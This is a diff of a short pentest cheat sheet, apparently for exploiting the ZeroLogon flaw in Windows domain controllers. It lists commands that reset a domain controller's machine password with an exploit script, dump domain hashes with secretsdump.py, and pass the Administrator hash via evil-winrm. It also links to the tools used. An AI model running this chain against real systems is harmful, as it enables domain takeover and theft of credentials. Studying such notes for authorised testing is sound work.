@@ -33,22 +33,21 @@ Check For Vulnerability
       
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit ZeroLogin
+-----------------
+              ./ExploitZeroLogin.py [DC-NetBIOS_name] [DC-IP]
+              (Now passsord is reset to No value // we can dump the hashes)
 
-      ./ExploitZeroLogin.py [DC-NetBIOS_name] [DC-IP]
-Now passsord is reset to No value // we can dump the hashes
-      ./secretsdump.py -just-dc -no-pass [DC-NetBIOS_name]\$@[DC-IP]
-Now hashes are pulled you can attempt to crack or PassThe-Has w/ Evil-winRM
-      evil-winrm -u Administrator -H <Local Admin Hash> -i <Machine IP>
+              ./secretsdump.py -just-dc -no-pass [DC-NetBIOS_name]\$@[DC-IP]
+              (Now hashes are pulled you can attempt to crack or PassThe-Has w/ Evil-winRM)
 
-..more to come
-      
+              evil-winrm -u Administrator -H <Local Admin Hash> -i <Machine IP>
+              
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Evil-winRM
+  https://github.com/Hackplayers/evil-winrm
 
-
-
-
+Impacket
+  https://github.com/SecureAuthCorp/impacket
 
 
 
